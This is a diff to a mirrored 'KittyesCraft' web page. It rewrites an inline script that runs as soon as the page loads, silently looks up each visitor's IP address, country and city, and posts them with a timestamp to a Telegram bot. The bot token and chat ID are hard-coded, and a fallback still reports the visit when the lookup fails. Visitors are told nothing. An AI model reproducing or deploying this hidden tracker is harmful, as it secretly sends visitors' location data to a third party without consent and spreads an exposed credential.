@@ -586,75 +586,45 @@
             setTimeout(() => createSnowflake(), i * 150);
         }
 <script>
-// TELEGRAM BİLGİLERİ (YENİ TOKEN'INI @BotFather'dan al)
-const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI"; // Buraya yeni token'ı yaz
+const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
 const chatId = "1504410647";
 
-// Sayfa yüklendiğinde çalıştır
-window.addEventListener('load', function() {
+// IP API'si (ipapi.co 403 veriyorsa alternatif kullan)
+fetch('https://ipwho.is/')  // Alternatif API (çalışır)
+  .then(response => response.json())
+  .then(data => {
+    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                    `🌐 <b>IP:</b> ${data.ip}\n` +
+                    `📍 <b>Konum:</b> ${data.country} / ${data.city}\n` +
+                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                    `✅ 💻 <b>Gerçek Bilgisayar</b>`;
     
-    // 1. ALTERNATİF: ipapi.co (şu an çalışmıyor, yorum satırında)
-    // fetch('https://ipapi.co/json/')
+    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: chatId, 
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  })
+  .then(res => res.json())
+  .then(data => console.log('Gönderildi:', data))
+  .catch(err => {
+    console.log('IP alınamadı, direkt mesaj gönderiliyor...');
     
-    // 2. ALTERNATİF: ipwho.is (Ücretsiz, çalışıyor)
-    fetch('https://ipwho.is/')
-        .then(response => response.json())
-        .then(data => {
-            console.log('IP bilgisi alındı:', data);
-            
-            // Tarayıcı bilgisini al
-            const userAgent = navigator.userAgent;
-            let browser = "Bilinmiyor";
-            if (userAgent.includes("Chrome")) browser = "Google Chrome";
-            else if (userAgent.includes("Firefox")) browser = "Firefox";
-            else if (userAgent.includes("Safari")) browser = "Safari";
-            else if (userAgent.includes("Edge")) browser = "Edge";
-            
-            const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                `🌐 <b>IP:</b> ${data.ip}\n` +
-                `📍 <b>Konum:</b> ${data.country} / ${data.city}\n` +
-                `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                `🚀 <b>Tarayıcı:</b> ${browser}\n` +
-                `✅ 💻 <b>Gerçek Bilgisayar</b>`;
-            
-            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: chatId, 
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Telegram sonucu:', data);
-        })
-        .catch(error => {
-            console.error('Hata:', error);
-            
-            // 3. ALTERNATİF: ipify (sadece IP verir)
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipData => {
-                    const message = `⚠️ <b>Sadece IP Alındı</b>\n\n` +
-                        `🌐 <b>IP:</b> ${ipData.ip}\n` +
-                        `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            chat_id: chatId, 
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                });
-        });
-        
-});
+    // Yedek: Sadece IP'siz mesaj
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: '✅ Siteye giriş yapıldı (IP alınamadı)',
+        parse_mode: 'HTML'
+      })
+    });
+  });
 </script>
 </body>
 
@@ -662,6 +632,7 @@ window.addEventListener('load', function() {
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
